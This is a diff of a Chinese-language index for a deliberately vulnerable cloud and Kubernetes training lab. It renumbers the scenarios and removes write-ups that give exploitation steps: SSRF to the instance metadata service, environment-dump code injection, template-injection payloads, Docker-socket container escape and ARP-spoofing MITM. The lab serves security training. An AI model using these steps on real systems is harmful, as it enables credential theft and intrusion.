@@ -25,17 +25,17 @@
 
 | 维度 | 数值 |
 |---|---|
-| Cloud 单点场景 | 31（Docker Compose 30 + KIND 1） |
-| K8s 单点场景 | 31 |
+| Cloud 单点场景 | 2（Docker Compose 2 + KIND 0） |
+| K8s 单点场景 | 60 |
 | 合计 | 62 |
 | 交付方式 | docker 30 / k8s 32 |
 | 难度分布 | L2 25 / L3 37 |
 | 具名 CVE 编号 | 7（CVE-2020-8554、CVE-2020-8558、CVE-2021-25742、CVE-2021-38647、CVE-2022-29972、CVE-2024-21626、CVE-2025-1974） |
-| 场景 ID | cloud-01..cloud-31，k8s-01..k8s-33（缺 k8s-04） |
+| 场景 ID | cloud-01..cloud-02，k8s-01..k8s-60 |
 
-Cloud 场景覆盖实例元数据（IMDS）、联邦身份（OIDC / SAML）、IAM 权限边界、共享托管服务与多租户隔离；
-K8s 场景覆盖容器逃逸（runC / cgroup / capability）、集群控制面组件（etcd / kubelet / API Server）、
-RBAC 与 ServiceAccount 滥用、网络策略与准入控制绕过。每个场景的 `GUIDE.md` 是它的事实来源。
+Cloud 场景覆盖公有云全局命名空间风险；K8s 作为私有云总类覆盖实例元数据、联邦身份、
+IAM 权限边界、共享托管服务、容器逃逸、集群控制面、RBAC、网络策略与准入控制等问题。
+每个场景的 `GUIDE.md` 是它的事实来源。
 
 <a id="二使用与部署"></a>
 
@@ -49,9 +49,9 @@ Kubernetes 场景还需 `kind` 与 `kubectl`。
 ./scripts/list-scenarios.sh
 
 # 启动 / 停止单个场景（脚本按注册表定位路径与类型，并生成运行时 Flag）
-./scripts/start-scenario.sh cloud-01     # Docker 场景
+./scripts/start-scenario.sh k8s-04     # Docker 场景
 ./scripts/start-scenario.sh k8s-01       # KIND 场景
-./scripts/stop-scenario.sh cloud-01
+./scripts/stop-scenario.sh k8s-04
 
 # 攻击链入口（见附录 A）
 ./scripts/start-chain.sh managed-db-lateral
@@ -78,7 +78,7 @@ GUIDE 中的示例值不是运行时真实值。单 Flag 场景使用 `CVE_FLAG`
 | 校验脚本 | 检查内容 | 实测输出 |
 |---|---|---|
 | `validate-structure.py` | 注册表 → 目录 / GUIDE / 端口 / Compose / 攻击链引用 | `Structure valid: 89 scenarios, 37 chains, 60 Compose files` |
-| `check-cloud-consistency.py` | 云场景 ID 连续性与链引用一致性 | `OK: 31 active cloud scenarios with contiguous IDs, valid chain references` |
+| `check-cloud-consistency.py` | 公有云 / 私有云场景数量、ID 连续性与链引用一致性 | `OK: 2 public cloud and 60 private cloud scenarios, valid chain references` |
 | `validate-flag-contract.py` | 单点与攻击链 Flag 运行时注入 | `Flag contract valid: all Docker scenarios and chain assignments use runtime variables` |
 | `validate-cloud-entrypoints.py --strict-probes` | 云场景公开入口契约 | `Cloud entrypoint contract valid: all Docker cloud ports target non-attacker services` |
 
@@ -91,7 +91,7 @@ GUIDE 中的示例值不是运行时真实值。单 Flag 场景使用 `CVE_FLAG`
 
 文档一致性结论：本节覆盖的 62 个 cloud / k8s 场景 `GUIDE.md` 全部存在且非空，
 `场景信息` 表中的 ID / 名称 / 技术·CVE / 难度 / 交付方式 / 入口与注册表逐项一致，
-且不存在空骨架区块。其中 32 个 K8s 交付场景（`type: k8s`，含 `CLOUD-02`）统一使用同一套中文区块：
+且不存在空骨架区块。其中 32 个 K8s 交付场景（`type: k8s`，含 `K8S-31`）统一使用同一套中文区块：
 `场景信息` → `场景概述` → `前置知识` → `利用步骤` → `验证命令` → `Flag` → `此场景利用了哪些知识` → `修复建议`。
 `scripts/validate-structure.py` 会校验每个场景 GUIDE 的骨架区块与注册表元数据。
 
@@ -107,748 +107,31 @@ GUIDE 中的示例值不是运行时真实值。单 Flag 场景使用 `CVE_FLAG`
 | 2 | 29 个 K8s GUIDE 含空的 `## 攻击路径与利用步骤` 占位标题 | 删除空标题，其内容来源（攻击路径摘要）并入 `场景概述` |
 | 3 | K8s GUIDE 中英标题混排、区块集合不统一（`Attack Path` / `Attack Path Summary`、`Verification` / `Verification Commands`） | 32 个 K8s 交付 GUIDE 统一为同一套中文区块模板 |
 | 4 | 攻击链存在两套 schema（`nodes` / `steps_detail`）且 3 条链用描述文本冒充场景 ID | 5 条 `steps_detail` 链并入 `nodes`，场景 ID 统一小写；非场景中间步骤改用 `name`；`validate-structure.py` 现在强制 `scenario` 必须是注册 ID |
+| 5 | 场景 ID 不连续且 K8S-31 原位于 cloud 域 | 29 个私有云场景移入 `scenarios/k8s/`，K8s ID 补齐为 `k8s-01..k8s-60`；公有云保留 `cloud-01..cloud-02` |
 
 ### 4.2 仍待处理
 
 | # | 问题 | 证据 | 建议 |
 |---|---|---|---|
-| 5 | 7 条攻击链缺 `domains` 字段 | `caps-to-cluster`、`hostpath-to-daemonset`、`pg-sqli-to-node`、`privilege-to-etcd`、`redis-to-k8s`、`sa-lateral-escape`、`wp-lfi-to-cluster` | 补齐 `domains` 以支持自动统计 |
-| 6 | 场景 ID 不连续 | 注册表缺 `k8s-04` | 在文档中显式说明，避免误判为缺失 |
-| 7 | `CLOUD-02` 位于 `scenarios/cloud/` 但类型为 `k8s` | 注册表 `cloud-02` 的 `type` 为 `k8s` | 在索引中标注交付方式（本文档已标注） |
-| 8 | 云场景公开出处覆盖不足 | 仅 9/31 个 cloud GUIDE 含显式公开出处线索 | 补齐公开披露出处链接 |
+| 6 | 7 条攻击链缺 `domains` 字段 | `caps-to-cluster`、`hostpath-to-daemonset`、`pg-sqli-to-node`、`privilege-to-etcd`、`redis-to-k8s`、`sa-lateral-escape`、`wp-lfi-to-cluster` | 补齐 `domains` 以支持自动统计 |
+| 7 | 云场景公开出处覆盖不足 | 仅部分 GUIDE 含显式公开出处线索 | 补齐公开披露出处链接 |
 
 <a id="五cloud公有云场景"></a>
 
-## 五、Cloud（公有云）场景（31）
+## 五、Cloud（公有云）场景（2）
 
 | ID | 名称 | 类型 | 难度 | 技术/CVE | 入口 |
 |---|---|---|---|---|---|
-| [CLOUD-01](#cloud-01) | SSRF to IMDS Credential Theft | docker | L3 | N/A (SSRF → IMDS) | `localhost:10601` |
-| [CLOUD-02](#cloud-02) | Container Escape via CAP_NET_RAW → Metadata MITM | k8s | L3 | N/A (CAP_NET_RAW + ARP spoofing) | KIND 集群内 |
-| [CLOUD-03](#cloud-03) | Lambda Code Injection → IAM PassRole | docker | L2 | N/A (command injection + IAM privesc) | `localhost:10604` |
-| [CLOUD-04](#cloud-04) | CloudFormation Template Injection → SSM | docker | L2 | N/A (CF Fn::Sub injection) | `localhost:10605` |
-| [CLOUD-05](#cloud-05) | CI/CD Pipeline Poisoning → Secret Exfiltration | docker | L2 | N/A (CI/CD script injection) | `localhost:10608` |
-| [CLOUD-06](#cloud-06) | AI Notebook Escape → K8s SA Token Theft | docker | L3 | N/A (notebook escape + SA token) | `localhost:10609` |
-| [CLOUD-07](#cloud-07) | OIDC Claim Mismatch → Cross-Repo AssumeRole | docker | L3 | N/A (OIDC federation misconfiguration) | `localhost:10611` |
-| [CLOUD-08](#cloud-08) | IAM Trust Policy Principal:* → Cross-Account Takeover | docker | L2 | N/A (overly permissive trust policy) | `localhost:10612` |
-| [CLOUD-09](#cloud-09) | Golden SAML → Federation Trust Root Compromise | docker | L3 | N/A (SAML signing key exposure) | `localhost:10613` |
-| [CLOUD-10](#cloud-10) | SCP Bypass via Legacy API Version | docker | L3 | N/A (SCP enforcement gap) | `localhost:10615` |
-| [CLOUD-11](#cloud-11) | Global S3 Namespace Squatting → Cross-Tenant Data Theft | docker | L2 | N/A (global namespace resource squatting) | `localhost:10621` |
-| [CLOUD-12](#cloud-12) | CosMiss: Managed Notebook Front-End → Cross-Tenant RCE | docker | L2 | N/A (forwardingId authz bypass, case #073) | `localhost:10623` |
-| [CLOUD-13](#cloud-13) | RDS log_fdw: Managed DB Host File Read → Provider Internal Creds | docker | L3 | N/A (log_fdw path traversal, case #015) | `localhost:10624` |
-| [CLOUD-14](#cloud-14) | Cloud SQL Engine Patch: Index Function Runs as Provider Role → Host RCE | docker | L3 | N/A (ATExecChangeOwner patch + ANALYZE, case #052) | `localhost:10625` |
-| [CLOUD-15](#cloud-15) | SynLapse: Shared Integration Runtime → Co-Tenant Credentials | docker | L3 | N/A (ODBC driver injection, CVE-2022-29972 lineage, case #062) | `localhost:10626` |
-| [CLOUD-16](#cloud-16) | ExtraReplica: Internal Subnet + CN Regex → Cross-Tenant DB Replication | docker | L3 | N/A (internal subnet + mis-anchored cert regex, case #061) | `localhost:10627` |
-| [CLOUD-17](#cloud-17) | WireServing: Host-Agent Channel → Node Bootstrap Secrets | docker | L3 | N/A (unvalidated transport cert, case #255/#184) | `localhost:10628` |
-| [CLOUD-18](#cloud-18) | Build Fleet + Internal Registry: Image Supply-Chain Overwrite | docker | L2 | N/A (unauth internal registry, case #260 lineage) | `localhost:10629` |
-| [CLOUD-19](#cloud-19) | Model-as-Code: Malicious Pickle → Inference Pod → Node IMDS | docker | L2 | N/A (pickle deserialization, case #091) | `localhost:10630` |
-| [CLOUD-20](#cloud-20) | AttachMe: Predictable Volume ID + Missing Ownership Check | docker | L2 | N/A (control-plane ownership check missing) | `localhost:10631` |
-| [CLOUD-21](#cloud-21) | Entra Actor Token: Tenant-A Token Accepted by Tenant-B Directory | docker | L2 | N/A (actor/tenant validation bug, case #246) | `localhost:10632` |
-| [CLOUD-22](#cloud-22) | OMIGOD: Cloud Middleware Unauth Management Channel → VM Root | docker | L2 | N/A (auth bypass in provider agent, CVE-2021-38647 lineage) | `localhost:10633` |
-| [CLOUD-23](#cloud-23) | IAM Enumeration 2.0: Unlogged AccessDenied Oracle | docker | L3 | N/A (uncovered service error oracle, case #134/#137) | `localhost:10634` |
-| [CLOUD-24](#cloud-24) | Service Catalog Beta Endpoint: Invisible Write | docker | L3 | N/A (non-production endpoint skips audit, case #154) | `localhost:10635` |
-| [CLOUD-25](#cloud-25) | Resource Explorer: Feature-Inherent Quiet Enumeration | docker | L3 | N/A (unlogged search API, case #148) | `localhost:10636` |
-| [CLOUD-26](#cloud-26) | CloudImposer: Dependency Confusion in Managed Data Platform | docker | L3 | N/A (global namespace dependency confusion, case #270) | `localhost:10637` |
-| [CLOUD-27](#cloud-27) | Silent Reaper: Low-Code Connector Secrets via Control Plane | docker | L2 | N/A (connector store tenant-scope missing, case #249/#197) | `localhost:10638` |
-| [CLOUD-28](#cloud-28) | Shared NAT Egress: Source-IP Allowlist Bypass | docker | L3 | N/A (service-tag source-IP trust, case #259) | `localhost:10639` |
-| [CLOUD-29](#cloud-29) | Dataform: Cross-Tenant Path Traversal in Managed Data Service | docker | L2 | N/A (cross-tenant path traversal, case #267) | `localhost:10640` |
-| [CLOUD-30](#cloud-30) | Serverless Default Service Account: Platform Identity Escalation | docker | L2 | N/A (over-scoped default SA, case #266/#272) | `localhost:10641` |
-| [CLOUD-31](#cloud-31) | Persistence-as-a-Service: Managed Automation Backdoor | docker | L3 | N/A (automation-runbook persistence, case #149) | `localhost:10642` |
+| [CLOUD-01](#cloud-01) | Global S3 Namespace Squatting → Cross-Tenant Data Theft | docker | L2 | N/A (global namespace resource squatting) | `localhost:10621` |
+| [CLOUD-02](#cloud-02) | CloudImposer: Dependency Confusion in Managed Data Platform | docker | L3 | N/A (global namespace dependency confusion, case #270) | `localhost:10637` |
 
 <a id="cloud-01"></a>
 
-### CLOUD-01 · SSRF → IMDS 凭据窃取
+### CLOUD-01 · 全局 S3 命名空间抢占 → 跨租户数据窃取
 
 | 字段 | 值 |
 |---|---|
 | ID | CLOUD-01 |
-| 名称 | SSRF to IMDS Credential Theft |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (SSRF → IMDS) |
-| 入口 | `localhost:10601` |
-| 目录 | `scenarios/cloud/ssrf-to-imds` |
-
-**场景概述**
-
-Web 应用存在 SSRF，可访问 `169.254.169.254`（实例元数据服务）。
-IMDS 是云里的"凭据售货机"：攻击者借 SSRF 读取实例角色凭据，再用
-凭据访问 S3 拿到 flag。
-
-**教材锚点**
-
-- 案例：IMDS 与 SSRF（Ch4 Technique 1，如 #019/#036 系列）
-- 平面：数据面（web）→ 控制面凭据；失败边界：网络/身份
-- 六镜头：MAGIC（IMDS 自动为实例注入角色凭据）；DETECTION（IMDS
-  访问通常不产生租户审计）
-
-**前置知识 / 条件**
-
-- SSRF 原理；IMDS 169.254.169.254 与实例角色；临时凭据使用
-
-**利用步骤**
-
-1. 在 `/fetch?url=` 输入 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-   获取角色名。
-2. 继续读取角色路径，获得 AccessKeyId / SecretAccessKey / Token。
-3. 用凭据访问 S3 模拟服务（`/latest/meta-data/...` 之外的 `s3` 容器），
-   读取 flag。
-4. 终端服务 s3 向 flag-vault 出示从 IMDS 偷到的 AK/SK 按 SigV4 签名，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 s3 向 flag-vault 出示「从 IMDS 偷到的 AK/SK 按 SigV4 签名」（校验模式 `sigv4`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-01-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-01 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-01 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Docker Compose web service, IMDS, and S3 simulator |
-| 侦察与前置条件 | SSRF URL behavior and IMDS role/credential paths |
-| 核心漏洞与利用 | Use SSRF to query 169.254.169.254 and obtain temporary credentials |
-| 权限、横向或影响 | Instance-role credential theft and S3 access |
-| 验证 | Use the credentials to read the S3 flag |
-
-**修复建议**
-
-SSRF 出口白名单；IMDSv2 + 令牌（TOFU）；网络层阻止应用访问链路本地地址。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-02"></a>
-
-### CLOUD-02 · CAP_NET_RAW → 元数据服务 MITM
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-02 |
-| 名称 | Container Escape via CAP_NET_RAW → Metadata MITM |
-| 交付方式 | k8s |
-| 难度 | L3 |
-| 技术/CVE | N/A (CAP_NET_RAW + ARP spoofing) |
-| 入口 | KIND 集群内入口（无固定宿主端口） |
-| 目录 | `scenarios/cloud/cap-netraw-metadata` |
-
-**场景概述**
-
-集群中攻击者 pod 被授予 CAP_NET_RAW（可收发原始报文），与 victim pod 同节点。攻击者
-用 ARP 欺骗劫持 victim → 元数据服务的流量，MITM 读取/替换 IMDS 响应，窃取实例凭据与 flag。
-
-**本机环境适配（2026-10-10 记录）**：kind 默认 CNI（kindnet）与 Calico 都是"点对点 veth +
-主机路由"的拓扑，同节点两个 pod 之间**没有共享二层**，ARP 欺骗在对端不生效（实测 victim
-的 ARP 表里只有网关，节点侧邻居表也不受骗）。因此本场景在本仓库当前的 KIND 环境里
-只能跑到"启动 + 负向门禁"（start=0 / gate=0，flag 已迁到集群内 Secret，pod spec 与容器
-env 无明文），参考利用需要换桥接型 CNI 或按等价原语改造，待用户口径。
-
-**前置知识 / 条件**
-
-- ARP 欺骗；IMDS 元数据协议；容器 capabilities
-
-#### Knowledge
-- Linux capabilities (CAP_NET_RAW) and network stack manipulation
-- ARP spoofing and man-in-the-middle attack techniques
-- EC2 Instance Metadata Service (IMDS) protocol
-
-#### Tools
-- arpspoof / ettercap: ARP spoofing tools
-- tcpdump / wireshark: Network traffic capture and analysis
-
-**利用步骤**
-
-1. 与 victim 同节点、带 CAP_NET_RAW 的攻击者 pod 起一个原始套接字，向 victim 广播 ARP 应答，
-   宣称元数据服务的地址在本机 MAC 上（同时向元数据服务侧宣称 victim 在本机 MAC 上，做双向劫持）。
-2. 打开发包所在 netns 的转发，让被劫持的流量继续能被真实 IMDS 处理；同时用 AF_PACKET 抓包，
-   从帧里取出 IMDS 响应正文（含实例凭据与 flag）。
-3. flag 只存在于集群内 Secret `imds-flag`（挂进 metadata-server 的 `/flag`），
-   因此明文只会出现在这条被劫持的响应里。
-
-> 当前 KIND 环境（kindnet / Calico 均为点对点 veth）不提供共享二层，第 1 步的 ARP 欺骗
-> 在对端不生效，参考利用尚未跑通；详见 `AiReport`/`AiRecord/changes/20261010-4.md` 的环境说明。
-
-**验证命令**
-
-```bash
-kubectl exec attacker -- cat /proc/1/status | grep Cap
-kubectl exec victim -- cat /tmp/metadata-credentials.json
-```
-
-**Flag**
-
-- 位置：集群内 Secret `imds-flag`（default），挂载进 `metadata-server` 的 `/flag/flag`；
-  IMDS 的凭据响应里带出 flag。
-- 形态：`flag{cloud-02-<16 位十六进制>}`。
-- 验收：`bash scripts/validate-k8s-gate.sh cloud-02 <agent-kubeconfig> <flag> <cluster>`（gate）+
-  `bash tests/k8s/run.sh cloud-02 <agent-kubeconfig> <flag> <cluster>`（参考利用，当前受限）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | KIND, CAP_NET_RAW, ARP, and metadata service networking |
-| 侦察与前置条件 | Victim/metadata traffic path and L2 neighbor discovery |
-| 核心漏洞与利用 | Perform ARP spoofing to MITM IMDS traffic |
-| 权限、横向或影响 | Instance credential interception across a shared node network |
-| 验证 | Capture the intercepted credential/flag response |
-
-**修复建议**
-
-默认移除 NET_RAW；元数据服务采用 IMDSv2 令牌 + 网络策略限制；
-二层隔离（每个节点独立 L2）。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-03"></a>
-
-### CLOUD-03 · Lambda 代码注入 → IAM PassRole
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-03 |
-| 名称 | Lambda Code Injection → IAM PassRole |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (command injection + IAM privesc) |
-| 入口 | `localhost:10604` |
-| 目录 | `scenarios/cloud/lambda-passrole` |
-
-**场景概述**
-
-API Gateway 把用户提交的代码原样转发给 Lambda 沙箱执行（命令注入）。
-Lambda 执行环境携带 IAM 临时凭据；攻击者利用凭据进一步 AssumeRole，
-完成服务侧提权。
-
-**教材锚点**
-
-- 案例：Serverless 执行面（Ch9）；IAM PassRole 提权路径
-- 平面：数据面（函数执行）→ 控制面（IAM）；失败边界：身份
-- 六镜头：MAGIC（托管函数执行即自动化以服务身份运行）；
-  IDENTITY（函数环境注入角色凭据）
-
-**前置知识 / 条件**
-
-- Serverless 执行模型；环境变量中的临时凭据；IAM AssumeRole
-
-**利用步骤**
-
-1. POST `/invoke`，`{"code": "import os; print(os.environ)"}` 读取
-   Lambda 环境（或直接 `cat` 环境文件），拿到 IAM AK/SK。
-2. 用凭据调用 IAM 服务（`_infra/iam-trust`）AssumeRole，换取目标角色。
-3. 用角色凭据读取受保护资源得到 flag。
-4. 终端服务 lambda 向 flag-vault 出示Lambda 执行角色的 AK/SK 签名，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 lambda 向 flag-vault 出示「Lambda 执行角色的 AK/SK 签名」（校验模式 `sigv4`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-03-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-03 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-03 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Serverless gateway, Lambda execution, and IAM |
-| 侦察与前置条件 | Command-injection input and Lambda role permissions |
-| 核心漏洞与利用 | Inject code/commands and request a function with PassRole |
-| 权限、横向或影响 | IAM privilege escalation through a delegated execution role |
-| 验证 | Invoke the created function or role path to obtain the flag |
-
-**修复建议**
-
-函数入口禁止任意代码执行；执行角色最小权限；运行时不注入可读凭据。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-04"></a>
-
-### CLOUD-04 · CloudFormation 模板注入 → SSM 参数泄露
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-04 |
-| 名称 | CloudFormation Template Injection → SSM |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (CF Fn::Sub injection) |
-| 入口 | `localhost:10605` |
-| 目录 | `scenarios/cloud/cf-injection` |
-
-**场景概述**
-
-CloudFormation 控制台接受 YAML 模板，解析器对 `Fn::Sub` 的处理存在
-注入：攻击者可在模板中注入表达式，让解析过程（以服务身份运行）执行
-意外的参数解析，泄露 SSM 参数中的机密。
-
-**教材锚点**
-
-- 案例：CloudFormation 模板注入（#005/#020）
-- 平面：控制面（IaC）→ 失败边界：身份/自动化
-- 六镜头：MAGIC（IaC 解析自动化以服务身份运行，是攻击目标）；
-  DETECTION（模板解析过程不产生直观审计）
-
-**前置知识 / 条件**
-
-- CloudFormation 内建函数（Fn::Sub / Ref / Fn::ImportValue）
-- IaC 服务端解析的注入面
-
-**利用步骤**
-
-1. 读取模板解析器根入口（localhost:10605）——除公布 `POST /parse` 外，
-   它还暴露了 `Fn::Sub` 可解析的参数命名空间（形如
-   `/secure/<name>`，例如 `/secure/app/db-password`）。
-2. 向该入口提交原始 YAML 模板，其中 `BucketName` 使用
-   `!Sub ${/secure/flag}` 简写（等价于 `Fn::Sub` 字典）。
-3. 解析器按 CloudFormation 内建函数求值，
-   将 `${/secure/flag}` 替换为 SSM 参数值。
-4. 观察解析器输出——泄露的 SSM 参数即为 flag。
-
-> 注意：模板必须以 YAML 原文提交；若套上 JSON 包装，`Fn::Sub` 会退化成
-> 普通字符串而不被求值。
-5. 终端服务 ssm 向 flag-vault 出示栈执行角色令牌，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 ssm 向 flag-vault 出示「栈执行角色令牌」（校验模式 `header-secret`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-04-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-04 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-04 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | CloudFormation-style templates, Fn::Sub, and SSM |
-| 侦察与前置条件 | Template interpolation context and accessible parameter names |
-| 核心漏洞与利用 | Inject a Fn::Sub expression to resolve protected SSM data |
-| 权限、横向或影响 | Control-plane secret disclosure |
-| 验证 | Read the leaked parameter/flag |
-
-**修复建议**
-
-模板表达式求值必须隔离；服务端解析不得接触高权限机密；对模板做
-严格语法校验。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-05"></a>
-
-### CLOUD-05 · CI/CD 管道投毒 → 凭据外泄
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-05 |
-| 名称 | CI/CD Pipeline Poisoning → Secret Exfiltration |
-| 交付方式 | docker |
-| 难度 | L2 |
-| 技术/CVE | N/A (CI/CD script injection) |
-| 入口 | `localhost:10608` |
-| 目录 | `scenarios/cloud/ci-poisoning` |
-
-**场景概述**
-
-攻击者可以向 CI 运行器提交恶意工作流/仓库内容，管道脚本存在 shell
-执行注入。CI 环境携带仓库 Secret（flag），投毒后可在构建过程中
-读取并外泄。
-
-**教材锚点**
-
-- 案例：托管 CI/CD 攻击面（Ch9）；CI 脚本注入
-- 平面：控制面（CI）→ 失败边界：身份/供应链
-- 六镜头：MAGIC（CI runner 以仓库身份自动执行）；SHARED（runner
-  是共享构建舰队）
-
-**前置知识 / 条件**
-
-- CI 工作流语法与脚本注入；CI Secret 环境
-
-**利用步骤**
-
-1. 向 git-server 提交恶意 workflow/脚本，触发 ci-runner 执行。
-2. 在注入的 shell 命令中读取 CI 环境变量/Secret 以及短期工作负载身份材料。
-3. 携带 `X-Workload-Token` 请求受保护的云 artifact API，读取跨租户构建产物与 flag。
-4. 终端服务 ci-runner 向 flag-vault 出示流水线工作负载令牌，换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 ci-runner 向 flag-vault 出示「流水线工作负载令牌」（校验模式 `header-secret`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-05-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-05 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-05 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Git/CI pipeline services and build execution |
-| 侦察与前置条件 | Pipeline trigger, repository input, and runner environment discovery |
-| 核心漏洞与利用 | Poison CI configuration or build commands |
-| 权限、横向或影响 | CI runner secret exposure |
-| 验证 | Read the runner-provided flag/secret |
-
-**修复建议**
-
-管道脚本参数化并禁止 shell 拼接；Secret 按最小权限注入；
-PR 触发任务不得携带写权限。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-06"></a>
-
-### CLOUD-06 · AI Notebook 逃逸 → K8s SA Token 窃取
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-06 |
-| 名称 | AI Notebook Escape → K8s SA Token Theft |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (notebook escape + SA token) |
-| 入口 | `localhost:10609` |
-| 目录 | `scenarios/cloud/notebook-escape` |
-
-**场景概述**
-
-托管 AI notebook 可执行任意代码（产品特性），但沙箱存在逃逸路径
-（如 Docker socket 暴露）。攻击者从 notebook 逃逸到宿主/集群侧，
-读取 K8s ServiceAccount token，访问集群 API。
-
-**教材锚点**
-
-- 案例：托管 notebook 攻击面（Ch10 Technique 2）；SageMaker/AI Hub（#011/#035）
-- 平面：数据面（notebook）→ 集群；失败边界：命名空间/宿主
-- 六镜头：MAGIC（notebook 执行即产品功能）；IDENTITY（SA token
-  随容器自动挂载）
-
-**前置知识 / 条件**
-
-- Notebook 代码执行；Docker socket 逃逸；SA token 与 K8s API
-
-**利用步骤**
-
-1. 在 notebook 里执行代码，探测挂载进来的 `/var/run/docker.sock`。
-2. 用这个 socket 与宿主机的 docker daemon 对话（`GET /containers/json`），列出租户之外的容器。
-3. 找到 `flag-vault` 容器，经 `POST /containers/<id>/exec` + `POST /exec/<id>/start` 以 root 执行
-   `cat /vault/flag`。
-4. 密文只存在于该容器内的 0600 root 文件里，宿主机与其它容器都拿不到——读到它即证明已完成
-   容器逃逸。
-
-**Flag**
-
-`flag{cloud-06-step2-...}`（集群 Secret）
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | Managed notebook, shell execution, and Kubernetes ServiceAccounts |
-| 侦察与前置条件 | Notebook execution context and mounted token location |
-| 核心漏洞与利用 | Escape the notebook execution boundary |
-| 权限、横向或影响 | Kubernetes ServiceAccount credential theft |
-| 验证 | Read the token/flag from the notebook container |
-
-**修复建议**
-
-notebook 沙箱禁用 Docker socket；SA 最小权限；执行环境与集群隔离。
-
-[↑ 返回索引](#五cloud公有云场景)
-
----
-
-<a id="cloud-07"></a>
-
-### CLOUD-07 · OIDC Claim 错配 → 跨仓库 AssumeRole
-
-| 字段 | 值 |
-|---|---|
-| ID | CLOUD-07 |
-| 名称 | OIDC Claim Mismatch → Cross-Repo AssumeRole |
-| 交付方式 | docker |
-| 难度 | L3 |
-| 技术/CVE | N/A (OIDC federation misconfiguration) |
-| 入口 | `localhost:10611` |
-| 目录 | `scenarios/cloud/oidc-federation` |
-
-**场景概述**
-
-IAM 的 OIDC 联合信任策略缺少/放宽了 claim 条件（如仓库名、环境、
-ref），攻击者可以伪造或利用其他仓库的 OIDC token 通过信任策略，
-以 AssumeRoleWithWebIdentity 获得角色凭据。
-
-**教材锚点**
-
-- 案例：OIDC 缺条件信任（Ch3 T1，GitHub OIDC any-repo 假设）
-- 平面：控制面（身份联合）→ 失败边界：身份
-- 六镜头：IDENTITY（信任策略未复检 claim）；BOUNDARY（账号间信任
-  被错误扩大）
-
-**前置知识 / 条件**
-
-- OIDC federation；AssumeRoleWithWebIdentity；trust policy 条件
-
-**利用步骤**
-
-1. 阅读 OIDC IdP 文档，了解 claim 结构（iss/sub/aud）。
-2. 发现信任策略只校验 issuer 不校验 sub/仓库条件。
-3. 伪造/借用合法签发的 JWT（含目标角色 sub），调用 AssumeRoleWithWebIdentity
-   获得角色凭据与 flag。
-4. 终端服务 iam 向 flag-vault 出示OIDC 的 RS256 令牌（含 iss/aud/sub），换成 flag 后回给调用方——明文只在这一步出现。
-
-**Flag**
-
-- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
-- 交付条件：只有 iam 向 flag-vault 出示「OIDC 的 RS256 令牌（含 iss/aud/sub）」（校验模式 `jwt`）时才交付；
-  其它容器、容器环境变量、落地文件与日志里都没有明文。
-- 形态：`flag{cloud-07-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
-- 验收：`python3 scripts/validate-cloud-gate.py cloud-07 <flag>`（gate）+
-  `python3 tests/cloud/run.py cloud-07 <flag>`（参考利用）。
-
-**知识维度**
-
-| 规划维度 | 所需知识 |
-|---|---|
-| 环境与访问 | OIDC issuer, JWT claims, and IAM role federation |
-| 侦察与前置条件 | Issuer/audience/subject claim validation and trust policy inspection |
